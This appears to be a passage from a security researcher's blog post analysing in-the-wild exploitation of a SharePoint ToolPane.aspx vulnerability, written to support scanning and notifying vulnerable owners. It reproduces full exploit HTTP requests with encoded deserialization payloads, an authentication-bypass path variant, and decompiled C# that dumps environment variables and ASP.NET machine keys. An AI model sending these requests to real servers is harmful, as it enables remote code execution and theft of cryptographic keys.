rQRY7XbLbGrhtN1smQq1Ryx9DMornHMA3cZOH%2F5O3IHf2OqP4edKfwP58D2tRXLo1IiR80sdNwW%2BfibkepwPfeJAjLH1poih4Ncgry6S9cPQaWMNFPrLx%2B0129NU4vvb8Y0CfyAKUL4DBy08PqksSd6PrMZzz7ngBeyB9ZD%2FSx245nUSzDkdoV9TqQsd%2BQbEfJQSgt%2FE%2BRqUBl3zUc9ob65o7fEZzSon9ahX%2Fn0KOU6wkw3pJX6TkfhhsP08B0Rkk%2FlAEpHhwHzz3AEbjblxdfJleI5MDjVWaljeoK4xd%2BA5z%2BuANxMaz0Fo1xVtniMHmJsIvUDWpzmPFqtkCZ%2BmKjOtlOik%2FFuqPeIC9k8xhzB8zEEZ7ofmOnkwRg0ePOWpCE%2F2KzBengMPF%2FXP53aa63HcCtGk9oyv9NHQH8cBq3Q8INjHw3gDug6QHCb6xTS3wq%2BPKf7gg51RwEN8grnOS%2BDwHA1fi%2F0jnivhi7JcyJV2pPaIBeD%2F8TnTj%2BKaFN%2BM345PM6HPQ7yHevDTmW9P0umMPpJeNFXQoIAf5CiWvrOb%2BHGjZ3zS5%2Bj97fg%2FRgFeEJGslQu0345vFPhfSQGN1qwRIp%2F2fPWKvGcK%2BdwF5f1GSV4Re%2FpW2BOzl2Ld4n1Pqm1vKI8n85u7Uw60WxxjrYDWmKrKhKbc8g%2FitGewgRz3rj495nMpx7q0c2OcH%2FdnIS9sr4ED54LbWA%2BQeV8zaITpvXxmEaXbb3%2BhvXzt3alvrHE4EeMq95sh1057wtzKdFVNra%2F8bnsx0UT6OQNe2%2BuEqbw7YpLfrd%2BWXJiSe7qSPYnBVC6mBnKTHHIOVYrbqBqmcRzsUxkm7%2Bfsqif%2B7RbuTNsc8%2Fbgg9Ne94eQMwf75zi%2FrqXlxDbRTub3I7HvZddP5%2BMnxZMsfg3ZoD2KxoNsFLEn1g9Ba%2BwnpH1oZ%2BM535sa8prBF5MfwF57OcS00W4xmMTBcX3nPiPX8qkvVSn7vV0Ga03hLdamsDYHPtHeTyUL3VwMaC3FbmFtwt7c9qr5Zk7LDg7dHPYAHJpGN74po0myZ5X2UsBjaqfkRy66B9P5s%2FITn%2BSH9jqI5nX595Cfy%2F2CWLfZsA3EnsAz%2BD2xS7dj2%2FelZMzOfCHZyKx6n7S%2FOjzaadrTOSjrbqpdF%2BtA4ReTsS%2FHAymzbRZVizfuIhI77cmem%2FWjDPOBTQQc69Eu%2BCS8gmBPKNQpRyL8PebFT7I%2Fst3%2FA%2FtT17%2Bavp7LSpCSFT6fsnVTO9qDnIijHZR7kni%2FK%2FtoYoBMKnLD8Wl%2FfscIN167eCYTtaw%2Fx3mI%2Feuss2e2qxtmTrpqfjVdTfPjYb%2F9V5qLBqm5qJLMRdnn5iK5%2F0bORU1qr4apdyXsST20TV6XJ%2F2btfawm4d6qIyx52Dawtr2wMa%2Bi75570gcjCb1q2XPYfxd9E0cnHs7auYGu0bPyjYM7TBo8d70h7Hy2I7yJnhPKO1bS%2F0nyS35PoC0Wffs5i3O7MzluxhT2KRcOIMPpmH%2FycLJYa4IoV8RNlwxDJrqFfMI4%2FfzU1nRpE3OqGqHxwFeNlLvxWh%2BSr%2BwVgb34rR%2FpU17ZIawleTru70SzoszjHk%2B6BU3sMf0rtPMofx%2FTs842DOS2Ft6rykZK%2BV8lPqXsDWawvklnmdUi%2FlkVXhc8v0qfp9ITJnPmpyY%2BFeRqGJ5lEtNvjxkHmWyBZ46veTdmediQoY9xt6PnaSF5a%2BTfSxYTW3EJ3kBXQ17Bv8rTL1fI%2FeMTceYsyA7k%2FUJDs1VFbNYP9mpttNzjr5IfYr9Vz0z9KbhxolKz%2BKndiUNgA0NUb4YxaMOpX3u8ryMhTkmHj%2BWr8xgzY8O3lTLm8dRlx%2BYbWmfdylYUoe6LGcK1iuPsGTzsClh8fOkX%2BaZ2ZExNfOjcZK%2FEx2ef5domeIP5oEW9lV5qfeUxuPTviQng31Q2GtjtX161%2BZhX1JXP2D%2F1xr2s1ietbD%2FivbxkB9g3wwg%2Byr2uPnGeOtoHNM3nUf9aQr2eWId8m%2FnM7K5pI12KldgQAfvL%2BYqdQS4vexX8YUv5O9Euy83f01%2FSOYpLpWQZXv4CXkJQGA54%2F1patDi2P1v1S05n7RYVsraiR5yPyH2fBm4l2HZMbs0L6A9jV8NeW4YS5tXrWG%2FG9rZe5bJlnKMMSzILPmrkDWs65KcQXXioHnusyIHZIWsZmpH6pRUU0RrdPEJ%2FKtqu%2B2gZ82tGXwke%2B3XLId9r3r46W0f56WSeTbQWd%2FlOzgO%2BxwHkbKxM3szyH3LZ%2FxR4olLHVRt%2BX5cj3VhTPs42Z%2F24rlC79fRWheJoXx%2B3qbPfuj4PD6B%2FFW1ox0%2B1NSp0Y8%2Fqd6DvBkpeePfddD8oLx9y398y398Ykxr3sr3YJPS4fzzWOh%2FNFky%2BL1LkU32oZ%2FyWNAf9vukvxjep%2BeVgRwzvaslWvbn5cgu5i6pw9rZ%2FvY55p%2BZfBfkN9JV5ja%2FJl2DR3vzJ8FChhxzbBUjeyhtHwekDbjBx3nTybpR81su6xNzJ1ZUgi9tj93JV9P99%2FRbCZ9%2Fn%2F78nQxnybqEXIEf2Tf0vjR0zUzp2jKta0PZB%2B%2FB0KbmFrDDQa8QpN7VID3hfX3GSRdVF3ri9PRNNdVPam6speZG7nVrfdgX%2B4Po3deIh75sjv8y9pnx2%2FlaKl78Y6xVWA6%2F86rmzt%2FjgmzWU7pwSOuCJ%2BU1dyHrjHf14n0w8hd99hfDC1lM3rXJ0ztvmG%2FUk13upOzyiO3yQPmgXf6iawVnMvfwnuIXW6dIeFBLSmPEPvvpXbDkWzMsV8qM8zs3FvKClP9o94qglw6b0q2JLq35KHLNvC%2B%2FsyLtaPhaynPhIr%2F68K0ipQx%2BUc7FdGfNDPKP9077IhZoT427%2BDwn%2FZBbBw0gF5RnwXpBvjUGL8Oafi5DNWkQgWPhlO%2FlTJmIPjHfS%2B93rYHbtN2VH31SOwzAkvktmYMLuBvk1uVHDvhXPfG24vfCqczNmncDC%2F8B%2FmPzzsG1g2sH1w6uh7ge4nqI6%2BHFLjpVePRdKaSw%2Bb%2BjlczMm8kSm1a2b0StbJaxS1yNV%2B%2FeXiWf%2BnruC3uf9uGwt%2FLra9XkE2Cpj3qlP9H28pe3V%2BcVLz%2FM96EPor29%2Bo3ff3vqk4D4ft1ln%2FSxvHQvjz6r9%2Fbq4oN%2Fv%2FzlfwCdHyNKU1UAAA%3D%3D%22+DataTable-CaseSensitive%3D%22false%22+runat%3D%22server%22%3E+%3C%2FScorecard%3AExcelDataSet%3E
HTTP/1.1 200 OK
Cache-Control: private, max-age=0
Transfer-Encoding: chunked
Content-Type: text/html; charset=utf-8
Content-Encoding: gzip
Last-Modified: Tue, 22 Jul 2025 10:07:03 GMT
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
X-SharePointHealthScore: 0
X-AspNet-Version: 4.0.30319
X-FRAME-OPTIONS: SAMEORIGIN
X-Powered-By: nosniff
MicrosoftSharePointTeamServices: 16.0.0.10337: 1; RequireReadOnly
X-Content-Type-Options: Allow
X-MS-InvokeApp: *
Date: Tue, 22 Jul 2025 10:07:03 GMT
Connection: close

-------------------- .NET Properties --------------------
Number of Logical Drives: 2
List of Logical Drives: C:\;D:\
Computer Name: LEGITSPINSTALL
Full path of the system directory: C:\Windows\system32
Current Directory: c:\windows\system32\inetsrv
Number of processors on this machine: 8
Number of milliseconds since system start: 2323322323
Username of the user currently logged onto the operating system: USER
Operating System Version: Microsoft Windows NT 10.0.14393.0
.NET Version: 4.0.30319.42000

....
PublicKeyToken: 8B70AAA9C5DD715A40BAAC0F0AAF844504D353E21262D2A9BD8318EA9BF62E65|HMACSHA256|FCFBF7315C7B9F2C57EFBD5C115A3FBD2E0B0A665975E01E8823E446EC6F3C2A|Auto|Framework20SP1
```

Hang on, a single request to dump it all, that's new.

There's one thing we have enough brain for though, it's decoding base64 stuff, and maybe decompile embedded code:

```csharp
using System;
using System.Collections;
using System.Reflection;
using System.Web;
using System.Web.Configuration;

#nullable disable
public class E
{
  public E()
  {
    try
    {
      HttpContext current = HttpContext.Current;
      if (current == null)
        return;
      current.Server.ClearError();
      current.Response.Clear();
      string s = "-------------------- .NET Properties --------------------\n" + $"Number of Logical Drives: {Environment.GetLogicalDrives().Length}\n" + $"List of Logical Drives: {string.Join(";", Environment.GetLogicalDrives())}\n" + $"Computer Name: {Environment.MachineName}\n" + $"Full path of the system directory: {Environment.SystemDirectory}\n" + $"Current Directory: {Environment.CurrentDirectory}\n" + $"Number of processors on this machine: {Environment.ProcessorCount}\n" + $"Number of milliseconds since system start: {Environment.TickCount}\n" + $"Username of the user currently logged onto the operating system: {Environment.UserName}\n" + $"Operating System Version: {Environment.OSVersion}\n" + $".NET Version: {Environment.Version}\n" + "\n-------------------- Environment Variables --------------------\n";
      foreach (DictionaryEntry environmentVariable in Environment.GetEnvironmentVariables())
        s += $"{environmentVariable.Key}:{environmentVariable.Value}\n";
      try
      {
        MachineKeySection machineKeySection = (MachineKeySection) Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a").GetType("System.Web.Configuration.MachineKeySection").GetMethod("GetApplicationConfig", BindingFlags.NonPublic | BindingFlags.Static).Invoke((object) null, new object[0]);
        s = $"{s}PublicKeyToken: {machineKeySection.ValidationKey}|{(object) machineKeySection.Validation}|{machineKeySection.DecryptionKey}|{machineKeySection.Decryption}|{(object) machineKeySection.CompatibilityMode}";
      }
      catch (Exception ex)
      {
      }
      current.Response.Write(s);
      current.Response.Flush();
      current.Response.End();
    }
    catch (Exception ex)
    {
    }
  }
}
```

That's it, it manages to run the embed DLL and forces the server to change its http reply. Who is it? A security company?

We don't know that (yet), but one thing is for sure, it is leaking the encryption keys as well, and most likely keeping
it for later!

# The scan v1

That's all we needed really, a way to determine vulnerability with a single request, and this one provides all the 
information we need to ensure people understand they are vulnerable!

So on we went, and after checking nothing was hurtful, we used their weapon, and started notifying people!

# The bypass

Oh yes, also, we kept this in the corner of our mind:

{{< twitter 1946850548046524533 >}}

None of the payloads previously shared had any trace of that slash, until, on the 23rd of July, our honeypot received
this version of the payload:

(Thank you `213.168.178.210`)

```http request
POST /_layouts/15/toolpane.aspx/xxx?DisplayMode=Edit&xxx=/ToolPane.aspx HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: Windows
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Referer: /_layouts/./SignOut.aspx
Content-Type: application/x-www-form-urlencoded
Content-Length: 5204

MSOTlPn_Uri=https://x.x.x.x/_controltemplates%2F15%2FAclEditor.ascx&MSOTlPn_DWP=%3C%25%40%20Register%20Tagprefix%3D%22Scorecard%22%20Namespace%3D%22Microsoft.PerformancePoint.Scorecards%22%20Assembly%3D%22Microsoft.PerformancePoint.Scorecards.Client%2C%20Version%3D16.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D71e9bce111e9429c%22%20%25%3E%0A%3C%25%40%20Register%20Tagprefix%3D%22asp%22%20Namespace%3D%22System.Web.UI%22%20Assembly%3D%22System.Web.Extensions%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D31bf3856ad364e35%22%20%25%3E%0A%3Casp%3AUpdateProgress%20ID%3D%22UpdateProgress1%22%20DisplayAfter%3D%2210%22%20runat%3D%22server%22%20AssociatedUpdatePanelID%3D%22upTest%22%3E%3CProgressTemplate%3E%3Cdiv%20class%3D%22divWaiting%22%3E%3CScorecard%3AExcelDataSet%20CompressedDataTable%3D%22H4sIAAAAAAAEANVa6XKbWBZOZumpqZ5/8wIu/%2B3EZrEcy2W7BoFAKAIJSYCgK1XNZhaxqFmEpOeZl5qnmTkX0OItsRN3elopS0jce%2B5Zvu/cw7l58/bNmzf/hRf6RK9//AnexMk6y53ohDFy492R4qSZn8TXZycY%2BvfuiC7CvEid69gp8tQI3x2NCjP0rY/OeprMnfja/PDBaFmtc7xNnjnYRfuvSPg/D2RWbxMnR2v9fRaFE8tzIuNHuGL821suNaK3b9G9H/4Mb//%2B29Uqu8yqIUerKIyz6%2BPj%2BuJyBddeni8uT0/LsjwpyZMkdU8JDMNPZ8KgFrsdG2U2rHp9XKRxIy17H/lWmmTJbf7eSqJLGPe%2BHnV85NvXx7Zza4Cp6IfMyY9vkB5O6EROnB/FRuQ8GHFUz77ks8bA6%2BM8LZzd73Lm0EWawvxBYhmh09yuBIMCi9BZTdcLp/7uJb7lHEV%2BPLSsIgVDMZBjrLbfithMith27Mf0ita5YYZPSM6cXwsntpxH56VJuVMXGYFmXR83saOTMHSsHMCQnXBO7KS%2BdTLws/wX/OefD8M7cdIlKJ%2Bd8HHupLERnnRXCwMpq6bGYuGkvxC7Capjnsj8ySDJ2CSNjBwmvDva3/sa%2BGHkbev2wy2O2y3MII1P73Zr%2BbGdlFmt5NAMwBZ0OUqTpW%2BjdUepk4E3DGQiCzB0yiSdf4UKJG7ekhetc8Mmz88csvXp086mOw56BXJ9%2BnR8lFdBgmga8RoF7PgubE5vrk7vxP30PipO90ho7lboe87Imko3P/wFqPqff13ZQGA3vaw/jOiruFfPqUV8ac52ofdLHNB%2Bl483Vw0PjhqtEKmnFTG2EAe4D1MIfcWuZpRnZLRnxK4DzvPjzEnzimQVN3Z5x/9y4nkPk3MDHL7PVvYz0tXN1T2yDG8PyfEQtt9Bp6O9Ut06%2BIApWB%2Bp4thwAWrma%2BzmSnByL7FFYM4NA1RKfSP0N87V6cHvzZiRgfgFBmU3Vw1sv4chIPxySxf7MstTP3aPb07L7jqcZBQlURQ1OoXXRYfavUoavU8UsWWR49CclK4SKWuLCJdmgGGDgCoE%2Bqwc0B3GVleYPeuHI7UV2rPxWlPLjGc7uBatFhqWh44yXhqEUoxUnhSJLq5tZEKYzjciJ5dDZs5W6/NSRybDjc0p%2BWAuLk1uFWrkeGESrc1gbocmrG2oQiET7TWMmcuEgmkMa6r4Vr/W1O71F2ZkZTyHbzQYZ3KhD/qp%2Bqy/MdR2MZpKtc4BlfFdETd7Y9yK5DbIxmGuZ9KlK/cUH%2BYFE0JpKVw71dWzthZYpDZVAnGqrYZTAdOn1NkQptTOUhiTVAqb8hiTwEsN/GC59m7NjhxiuopvKEqgOq4vUjt/tmD8KtNVEUPjrHWrp4P/rCgMKvtnHQ%2BuN2D/Xm5ErVQ8nzozEWRihUyOwSetGGzMLUJcWsjf/m8VJ5giuRUmKBe9zZmD6y5674CNFEX/wW2sTBnMiEP9zhg%2B3NnU1dVVqBMspisissUDvJxrswqrPNg712d8v4Mw3el29z7SuJpXWg%2B9n4%2BTCzlSNoCdtUYoXaPxEfigxfe83ORam9Gkn9i9cTn0L5ZgewI48sCHOYxdm6S41GOpAJznA9IG3Otngw1fCoy2dDg2N%2Bl2aYF88DdW63bmM1Li8jTlOhyembFw7jCYb/TGmMUkywEpBgZwT5sJhamGgRW1wW4dG0Tgh0mbhBhEDn2xFhiKGJCeZ6rlA3nWBvM1YrUeqC24r2wsjg306WIbyw/aTAR9cN/szdvmTAxMsp8ZKv9QTvBZOQX4LTI5JbA5FP/cs0gxNNV%2B5kzxA4zwIu1TILdzZqqrwtosSPBnYPb43IzYXJ%2BJpaaK4XAf15mu8nd03OWj0A4fk2dPP6%2BnQij%2BIFT6Q4LdWAT4Nlq1Rsqd9fyRi31EtvPMaqRBxQE5rwvx8uRef2lHIcKS6zCLgT6bt/lIW/F%2BZztOdmadEGz6APera74nnCu9sNRnmM938dDmvKXeRbrJbR5yqM2OWxYnP2fNYqoqmMG15zLHAoeQLODb5qzxQf03gvW2/Bzd9WMhEe1Chy0KuOhVcfJbIvg7gbEhyq2Qv%2Bv4AZfv%2BvlVuF0KhIbrgR0JU3YuTjueQHQvBuSBvjsflMsp0f8V5agxx2Ka0gFu6Qsd7B3MGx%2ByKA8gzIxDKxbc58zlmZ2vLp4c03PPkS8ghpHg8%2B523ERtgT9Y4DbELc6ncA25QZwAZpdgf6BPOpHwVIy7IFtdzfngXqy6bd%2BIwOfdMcSDlYDfhKGCPRAXsCsxibEEuQfhGEN7185G%2Bol4x%2BKt1sR4RLc3wCMMcmGh38NIg7P1cI72ZshDkc2ZHBsDljAB/GcFCxrkzZHMcbTydFL4aZsPvjI%2Bu/mg11P43o950i%2Bds%2BEcMAUc1wOIzm5cWADOPTMSK%2B6BPxC%2Bg30ul1096LeBp1u/DhF/YGwPvquausL1CX/Pxm/jYSMD9G3hJlcu78XuYoC9LPaH2H1ybvAifJ8L9AvxTWL%2BKHg69gc5bDOcNzrS%2B5g5QddH648jFvJMe%2B3IDVZgz7NJ%2BbySJ1eYRH5AsUG2Qe7sY46ie2ZPCR9wCORJs35sQxzMeHyfIxePYeFgj69zeJyUvH9xP/4H/GltsdA3YxHT1BbsKcCTzWJb3z7gB%2BT/jhXZOMSvsHt38L/3zUFMQVazhrTfW%2BJkzVeY1z1Ye2nFYYMNCe7Z%2BHBexb/iKsLlGOpvhFMLYmH3wqdwDfLYtU4qOapDHuwfrFjVJhoOdR/RhlpcDHl2f73DzoR/gOlDf1Sx/D4%2B2vzf%2Bsj/vI%2BUiIVaa1zvxRVHvou/sD%2Bqv8ZQX4K%2B5W/lr2fkTO%2Bg1jvIBZDbSPd8m2v4nnU%2BQTV8F%2Br0eBw6PamQIN9A7Q96PFIj%2BPxPr7Uvai%2BrWbzbCYxv9rMp2q/R3goxn6FYkR3QX0Q597X2nOBJ/%2BGPYIR7dM%2BeQU7GXnu/fjZG1w8x%2BtK9/Dm16sueQeQX1UJa/AgGQ3ttQK32yjXqHf7eMp/n6%2B9eU76MO/5j3FHI/sI%2BfJ6jP8%2BNL9nWYOCx9ffX8ra%2BkvzBfVw/7Zsv8eK1OD9/Bc6zZiT5z%2BUN2HzgG5Bf9yw9K57/1KFk1Orx931NeD7mlBj0COH5F56jYE%2BeLZo92VuaHNjroh4axcP%2Bk%2BmqDffkntn4TqDsvNk/V1QpMAL7op5UupepsLBXrJ1J%2B/GeCuKbivvAsb4Z6csndfW/cb4755GxtDRHH3266pNJ1W/fbJtkITFdG/VDJG/fI5J0wEE/1mfSBHC2RvtP1TOR9z0aJh4DP7b9EqXCBR3dyWGi/mC9body4U8SyhfF28/39sloz%2B63Om4GqjP8QR%2BVswHHGtP/HfvdWHaw9rbW%2B369drdEDdXBQd8w41kd8peIepttsV4L1ixdqH8yu6es9Sle6DMFnqvYDHSTbBXNE2EfC2WTyEMzwH1xY3uiKuBi0G0Jm3EoMG6LdjURgUdlO2vgNnrWa2Km17kL7DXWr9CnmgorLdI2Q0YmNFXaiAGsv5E5BvGA7hz0EeG5kGuT1rolAnZTe0YVKurxQs2goRzpaqOq/65AXocaih5XjeYujXrQ9LdytOZRtedIq86OR3LFg75ErBC3ao4o4kKH3Ff5XlpMDdUuAPso7msa9h6YF1ph1YOUoNaH2PTBHwe1fIn4A3%2BUwDN77Fe9TRXH%2BkxZnTWIdc44Qx8cW33p72zc5mqerX3xkX3Al0XHu5%2BXd/0DVF9s9In34Pzho1Qlp4%2BUlFS5qvK3p6GPnkS0cwvlEmku1L9XY8V9X7N5ti81vRKChYXNQHXX3Z4xyMmDsevDvuj2tznHIdHM3l6oHTBhw7s7HR7RfXCApQf21Fjha71R3ums7pzD7c9oXEHJzcf0/B6chCn9%2BsApaT7nlfPpcfXxkS6vr69OmyPVm%2B3R6%2BFxa32EzDcHqAdHoofnzMcw9e5A%2BOGxI9/TFx5Xw4zqKL36rI7n4er%2Bwf3pvf9HcPPj/wB06xsrqiQAAA%3D%3D%22%20DataTable-CaseSensitive%3D%22false%22%20runat%3D%22server%22%3E%3C/Scorecard%3AExcelDataSet%3E%3C/div%3E%3C/ProgressTemplate%3E%3C/asp%3AUpdateProgress%3E
HTTP/1.1 302 Found
Cache-Control: private, max-age=0
Content-Type: text/html; charset=utf-8
Expires: Tue, 08 Jul 2025 05:03:07 GMT
Last-Modified: Wed, 23 Jul 2025 05:03:07 GMT
Location: http://x.x.x.x/_layouts/15/Authenticate.aspx?Source=%2F%5Flayouts%2F15%2Ftoolpane%2Easpx%2Fxxx%3FDisplayMode%3DEdit%26xxx%3D%2FToolPane%2Easpx
Server: Microsoft-IIS/10.0
X-SharePointHealthScore: 0
X-AspNet-Version: 4.0.30319
X-FRAME-OPTIONS: SAMEORIGIN
SPRequestDuration: 344
SPIisLatency: 0
X-Powered-By: nosniff
MicrosoftSharePointTeamServices: 16.0.0.10337: 1; RequireReadOnly
X-Content-Type-Options: Allow
X-MS-InvokeApp: *
Date: Wed, 23 Jul 2025 05:03:07 GMT
Connection: close
```

What does the encoded part do? We're leaving it for someone else to figure out, but after a quick look it sets itself up
to receive additional parameters from the URI.

The keen reader will have noticed the important part: the holy `/`!

And that's all we need for scan v2!

# What else is there to add?

Not sure really, but here is our vulnerability tester.

{{< gist gboddin 4241363c84ef7e232bab0ed1b5ca3c0c >}}

Check it out on [Github](https://gist.github.com/gboddin/4241363c84ef7e232bab0ed1b5ca3c0c).

Yes, this is a Golang house here, but I'm sure someone can get it Pythoned for you!



## TODO

Credits and various links and thanks coming later!


